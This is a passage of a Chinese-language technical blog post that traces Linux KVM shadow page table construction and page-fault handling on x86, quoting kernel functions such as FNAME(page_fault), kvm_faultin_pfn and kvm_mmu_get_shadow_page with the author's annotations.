alt=\"image-20230917150408144\" style=\"zoom: 80%;\">\n\n<h2 id=\"影子页表的建立-x2F-缺页异常处理\"><a href=\"#影子页表的建立-x2F-缺页异常处理\" class=\"headerlink\" title=\"影子页表的建立 &#x2F; 缺页异常处理\"></a>影子页表的建立 &#x2F; 缺页异常处理</h2><p>​\t\t保护模式guest发生缺页异常时，控制cr2寄存器中存储的是GVA，而只有guest知道GVA到GPA的映射，所以，缺页异常处理函数首先<strong>需要遍历guest的页表，取出对应的GPA。</strong></p>\n<p>​\t\t如果没有建立GVA到GPA的映射，则KVM向guest注入<strong>缺页异常</strong>，guest进行正常的缺页异常处理，完成GVA到GPA的映射。建立好GVA到GPA的映射后，然后再继续建立GVA到HPA的映射。</p>\n<p>​\t\t刚开始时，影子页表是空的，所以开始时任何内存访问操作都会引起缺页异常，导致vm exit 进入handle_exception_nmi (不可屏蔽中断异常处理)</p>\n<p>​\t\thandle_exception_nmi从这里进入异常处理</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">handle_exception_nmi</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">vcpu_vmx</span> *<span class=\"title\">vmx</span> =</span> to_vmx(vcpu);</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">kvm_run</span> *<span class=\"title\">kvm_run</span> =</span> vcpu-&gt;run;</span><br><span class=\"line\">......</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (is_page_fault(intr_info)) &#123;</span><br><span class=\"line\">\t\tcr2 = vmx_get_exit_qual(vcpu);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (enable_ept &amp;&amp; !vcpu-&gt;arch.apf.host_apf_flags) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t * EPT will cause page fault only if we need to</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t * detect illegal GPAs.</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t */</span></span><br><span class=\"line\">\t\t\tWARN_ON_ONCE(!allow_smaller_maxphyaddr);</span><br><span class=\"line\">\t\t\tkvm_fixup_and_inject_pf_error(vcpu, cr2, error_code);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t&#125; <span class=\"keyword\">else</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> kvm_handle_page_fault(vcpu, error_code, cr2, <span class=\"literal\">NULL</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">\t&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t调用链如下</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">- kvm_handle_page_fault</span><br><span class=\"line\">    - kvm_mmu_page_fault</span><br><span class=\"line\">    \t- kvm_mmu_do_page_fault</span><br><span class=\"line\">    \t\t- </span><br></pre></td></tr></table></figure>\n\n<p>​\t\t到了这里之后, 如果没开启ept，会进入else，<font color=\"red\">猜测这里的page_fault是FNAME(page_fault)，这样就连起来了</font></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"keyword\">inline</span> <span class=\"type\">int</span> <span class=\"title function_\">kvm_mmu_do_page_fault</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu, <span class=\"type\">gpa_t</span> cr2_or_gpa,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t\t\tu32 err, <span class=\"type\">bool</span> prefetch, <span class=\"type\">int</span> *emulation_type)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    .....</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (IS_ENABLED(CONFIG_RETPOLINE) &amp;&amp; fault.is_tdp)</span><br><span class=\"line\">\t\tr = kvm_tdp_page_fault(vcpu, &amp;fault);</span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t\tr = vcpu-&gt;arch.mmu-&gt;page_fault(vcpu, &amp;fault);</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"GVA-GPA-映射\"><a href=\"#GVA-GPA-映射\" class=\"headerlink\" title=\"GVA-GPA 映射\"></a>GVA-GPA 映射</h3><p>kvm\\mmu\\paging_tmpl.h</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">FNAME</span><span class=\"params\">(page_fault)</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu, <span class=\"keyword\">struct</span> kvm_page_fault *fault)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">guest_walker</span> <span class=\"title\">walker</span>;</span></span><br><span class=\"line\">\t<span class=\"type\">int</span> r;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpgprintk(<span class=\"string\">&quot;%s: addr %lx err %x\\n&quot;</span>, __func__, fault-&gt;addr, fault-&gt;error_code);</span><br><span class=\"line\">\tWARN_ON_ONCE(fault-&gt;is_tdp);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">\t * Look up the guest pte for the faulting address.</span></span><br><span class=\"line\"><span class=\"comment\">\t * If PFEC.RSVD is set, this is a shadow page fault.</span></span><br><span class=\"line\"><span class=\"comment\">\t * The bit needs to be cleared before walking guest page tables.</span></span><br><span class=\"line\"><span class=\"comment\">\t */</span></span><br><span class=\"line\">\tr = FNAME(walk_addr)(&amp;walker, vcpu, fault-&gt;addr,</span><br><span class=\"line\">\t\t\t     fault-&gt;error_code &amp; ~PFERR_RSVD_MASK);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">\t * The page is not mapped by the guest.  Let the guest handle it.</span></span><br><span class=\"line\"><span class=\"comment\">\t */</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!r) &#123;</span><br><span class=\"line\">\t\tpgprintk(<span class=\"string\">&quot;%s: guest page fault\\n&quot;</span>, __func__);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (!fault-&gt;prefetch)</span><br><span class=\"line\">\t\t\tkvm_inject_emulated_page_fault(vcpu, &amp;walker.fault);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> RET_PF_RETRY;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfault-&gt;gfn = walker.gfn;</span><br><span class=\"line\">\tfault-&gt;max_level = walker.level;</span><br><span class=\"line\">\tfault-&gt;slot = kvm_vcpu_gfn_to_memslot(vcpu, fault-&gt;gfn);<span class=\"comment\">//获取内存条信息</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (page_fault_handle_page_track(vcpu, fault)) &#123;</span><br><span class=\"line\">\t\tshadow_page_table_clear_flood(vcpu, fault-&gt;addr);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> RET_PF_EMULATE;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tr = mmu_topup_memory_caches(vcpu, <span class=\"literal\">true</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (r)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> r;</span><br><span class=\"line\"></span><br><span class=\"line\">\tr = kvm_faultin_pfn(vcpu, fault, walker.pte_access);<span class=\"comment\">//关键函数</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (r != RET_PF_CONTINUE)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> r;</span><br><span class=\"line\">....</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t在硬件MMU中，Table walk单元负责遍历页表，这里函数walk_addr就相当于硬件MMu中Table walk，负责遍历guest页表。 <strong>异常处理函数首先调用这个函数遍历guess页表，尝试取出GPA</strong>，见14行代码，遍历完后，把具体信息保存在walker中。</p>\n<p>​\t\t感觉写的注释非常精髓</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\"> * Fetch a guest pte for a guest virtual address, or for an L2&#x27;s GPA.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">FNAME</span><span class=\"params\">(walk_addr_generic)</span><span class=\"params\">(<span class=\"keyword\">struct</span> guest_walker *walker,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t\t    <span class=\"keyword\">struct</span> kvm_vcpu *vcpu, <span class=\"keyword\">struct</span> kvm_mmu *mmu,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t\t    <span class=\"type\">gpa_t</span> addr, u64 access)</span></span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\t\t如果返回0，说明没有建立映射，进行guest的缺页处理，注入异常，guest去建立GVA到GPA的映射。见20行。</p>\n<p>​\t\t进入到kvm_inject_emulated_page_fault</p>\n<p>x86.c</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">kvm_inject_emulated_page_fault</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t\t    <span class=\"keyword\">struct</span> x86_exception *fault)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">kvm_mmu</span> *<span class=\"title\">fault_mmu</span>;</span></span><br><span class=\"line\">\tWARN_ON_ONCE(fault-&gt;<span class=\"built_in\">vector</span> != PF_VECTOR);</span><br><span class=\"line\"></span><br><span class=\"line\">\tfault_mmu = fault-&gt;nested_page_fault ? vcpu-&gt;arch.mmu :</span><br><span class=\"line\">\t\t\t\t\t       vcpu-&gt;arch.walk_mmu;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">\t * Invalidate the TLB entry for the faulting address, if it exists,</span></span><br><span class=\"line\"><span class=\"comment\">\t * else the access will fault indefinitely (and to emulate hardware).</span></span><br><span class=\"line\"><span class=\"comment\">\t */</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> ((fault-&gt;error_code &amp; PFERR_PRESENT_MASK) &amp;&amp;</span><br><span class=\"line\">\t    !(fault-&gt;error_code &amp; PFERR_RSVD_MASK))</span><br><span class=\"line\">\t\tkvm_mmu_invalidate_addr(vcpu, fault_mmu, fault-&gt;address,</span><br><span class=\"line\">\t\t\t\t\tKVM_MMU_ROOT_CURRENT);</span><br><span class=\"line\"></span><br><span class=\"line\">\tfault_mmu-&gt;inject_page_fault(vcpu, fault);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">EXPORT_SYMBOL_GPL(kvm_inject_emulated_page_fault);</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t会调用 inject_page_fault, 对应的函数如下</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">kvm_inject_page_fault</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu, <span class=\"keyword\">struct</span> x86_exception *fault)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t++vcpu-&gt;stat.pf_guest;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">\t * Async #PF in L2 is always forwarded to L1 as a VM-Exit regardless of</span></span><br><span class=\"line\"><span class=\"comment\">\t * whether or not L1 wants to intercept &quot;regular&quot; #PF.</span></span><br><span class=\"line\"><span class=\"comment\">\t */</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (is_guest_mode(vcpu) &amp;&amp; fault-&gt;async_page_fault)</span><br><span class=\"line\">\t\tkvm_queue_exception_vmexit(vcpu, PF_VECTOR,</span><br><span class=\"line\">\t\t\t\t\t   <span class=\"literal\">true</span>, fault-&gt;error_code,</span><br><span class=\"line\">\t\t\t\t\t   <span class=\"literal\">true</span>, fault-&gt;address);</span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t\tkvm_queue_exception_e_p(vcpu, PF_VECTOR, fault-&gt;error_code,</span><br><span class=\"line\">\t\t\t\t\tfault-&gt;address);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"GPA-HPA-映射\"><a href=\"#GPA-HPA-映射\" class=\"headerlink\" title=\"GPA-HPA 映射\"></a>GPA-HPA 映射</h3><p>​\t\t建立映射后往后走，来到下一个重要函数</p>\n<p>​\t\t<strong>kvm_faultin_pfn这个函数用来处理虚拟地址映射到宿主机的物理地址</strong></p>\n<p>mmu.c</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">kvm_faultin_pfn</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu, <span class=\"keyword\">struct</span> kvm_page_fault *fault,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t   <span class=\"type\">unsigned</span> <span class=\"type\">int</span> access)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> ret;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfault-&gt;mmu_seq = vcpu-&gt;kvm-&gt;mmu_invalidate_seq;</span><br><span class=\"line\">\tsmp_rmb();</span><br><span class=\"line\"></span><br><span class=\"line\">\tret = __kvm_faultin_pfn(vcpu, fault);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (ret != RET_PF_CONTINUE)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> ret;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (unlikely(is_error_pfn(fault-&gt;pfn)))</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> kvm_handle_error_pfn(vcpu, fault);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (unlikely(!fault-&gt;slot))</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> kvm_handle_noslot_fault(vcpu, fault, access);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> RET_PF_CONTINUE;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t这其中主要调用__kvm_faultin_pfn完成实际映射工作</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> __kvm_faultin_pfn(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu, <span class=\"keyword\">struct</span> kvm_page_fault *fault)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">kvm_memory_slot</span> *<span class=\"title\">slot</span> =</span> fault-&gt;slot;</span><br><span class=\"line\">\t<span class=\"type\">bool</span> async;</span><br><span class=\"line\"></span><br><span class=\"line\">.....</span><br><span class=\"line\">\tasync = <span class=\"literal\">false</span>;</span><br><span class=\"line\">\tfault-&gt;pfn = __gfn_to_pfn_memslot(slot, fault-&gt;gfn, <span class=\"literal\">false</span>, <span class=\"literal\">false</span>, &amp;async,</span><br><span class=\"line\">\t\t\t\t\t  fault-&gt;write, &amp;fault-&gt;map_writable,</span><br><span class=\"line\">\t\t\t\t\t  &amp;fault-&gt;hva);</span><br><span class=\"line\">......</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t而这里，最关键的是__gfn_to_pfn_memslot，通过这个函数拿到pfn</p>\n<h3 id=\"影子页表填充\"><a href=\"#影子页表填充\" class=\"headerlink\" title=\"影子页表填充\"></a>影子页表填充</h3><p>​\t\t映射和填充是两回事? </p>\n<p>for_each_shadow_entry用来迭代不同页表级别</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">FNAME</span><span class=\"params\">(fetch)</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu, <span class=\"keyword\">struct</span> kvm_page_fault *fault,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t <span class=\"keyword\">struct</span> guest_walker *gw)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    .....</span><br><span class=\"line\">    \tfor_each_shadow_entry(vcpu, fault-&gt;addr, it) &#123; <span class=\"comment\">//应该是用来查找对应级别的页表目录</span></span><br><span class=\"line\">\t\t<span class=\"type\">gfn_t</span> table_gfn;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tclear_sp_write_flooding_count(it.sptep);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (it.level == gw-&gt;level)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\ttable_gfn = gw-&gt;table_gfn[it.level - <span class=\"number\">2</span>]; <span class=\"comment\">//获取当前页表级别的表项对应的页表页的GFN</span></span><br><span class=\"line\">\t\taccess = gw-&gt;pt_access[it.level - <span class=\"number\">2</span>];</span><br><span class=\"line\">\t\tsp = kvm_mmu_get_child_sp(vcpu, it.sptep, table_gfn,</span><br><span class=\"line\">\t\t\t\t\t  <span class=\"literal\">false</span>, access); <span class=\"comment\">//尝试获取或创建当前页表级别的影子页表页，false表示不创建新的，仅尝试获取已存在的</span></span><br><span class=\"line\"><span class=\"comment\">//it.sptep 表示当前的SPTE</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (sp != ERR_PTR(-EEXIST)) &#123; <span class=\"comment\">// 成功获取或创建</span></span><br><span class=\"line\">\t\t.............</span><br><span class=\"line\">\t\t<span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">\t\t * Verify that the gpte in the page we&#x27;ve just write</span></span><br><span class=\"line\"><span class=\"comment\">\t\t * protected is still there.</span></span><br><span class=\"line\"><span class=\"comment\">\t\t */</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (FNAME(gpte_changed)(vcpu, gw, it.level - <span class=\"number\">1</span>))</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">goto</span> out_gpte_changed;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (sp != ERR_PTR(-EEXIST))</span><br><span class=\"line\">\t\t\tlink_shadow_page(vcpu, it.sptep, sp);<span class=\"comment\">//将影子页表与SPTE进行链接</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (fault-&gt;write &amp;&amp; table_gfn == fault-&gt;gfn)</span><br><span class=\"line\">\t\t\tfault-&gt;write_fault_to_shadow_pgtable = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            </span><br><span class=\"line\">           .....</span><br><span class=\"line\">        ret = mmu_set_spte(vcpu, fault-&gt;slot, it.sptep, gw-&gt;pte_access,</span><br><span class=\"line\">\t\t\t   base_gfn, fault-&gt;pfn, fault); <span class=\"comment\">//设置/更新PTE</span></span><br><span class=\"line\">          .....</span><br><span class=\"line\">\t&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\tkvm_mmu_get_child_sp</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"keyword\">struct</span> kvm_mmu_page *<span class=\"title function_\">kvm_mmu_get_child_sp</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t\t\t\t u64 *sptep, <span class=\"type\">gfn_t</span> gfn,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t\t\t\t <span class=\"type\">bool</span> direct, <span class=\"type\">unsigned</span> <span class=\"type\">int</span> access)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">union</span> <span class=\"title\">kvm_mmu_page_role</span> <span class=\"title\">role</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (is_shadow_present_pte(*sptep) &amp;&amp; !is_large_pte(*sptep))</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> ERR_PTR(-EEXIST); <span class=\"comment\">// 检查是否存在</span></span><br><span class=\"line\"></span><br><span class=\"line\">\trole = kvm_mmu_child_role(sptep, direct, access); <span class=\"comment\">//新的页表的属性</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> kvm_mmu_get_shadow_page(vcpu, gfn, role);<span class=\"comment\">//查找/创建新的影子页表页</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>​\t\tkvm_mmu_get_shadow_page来创建&#x2F;查找</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"keyword\">struct</span> kvm_mmu_page *<span class=\"title function_\">kvm_mmu_get_shadow_page</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t\t\t\t    <span class=\"type\">gfn_t</span> gfn,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t\t\t\t    <span class=\"keyword\">union</span> kvm_mmu_page_role role)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">shadow_page_caches</span> <span class=\"title\">caches</span> =</span> &#123;</span><br><span class=\"line\">\t\t.page_header_cache = &amp;vcpu-&gt;arch.mmu_page_header_cache,</span><br><span class=\"line\">\t\t.shadow_page_cache = &amp;vcpu-&gt;arch.mmu_shadow_page_cache,</span><br><span class=\"line\">\t\t.shadowed_info_cache = &amp;vcpu-&gt;arch.mmu_shadowed_info_cache,</span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> __kvm_mmu_get_shadow_page(vcpu-&gt;kvm, vcpu, &amp;caches, gfn, role);<span class=\"comment\">//gfn表示需要映射的guest页的地址</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t__kvm_mmu_get_shadow_page 最终的查找&#x2F;创建影子页表页</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span 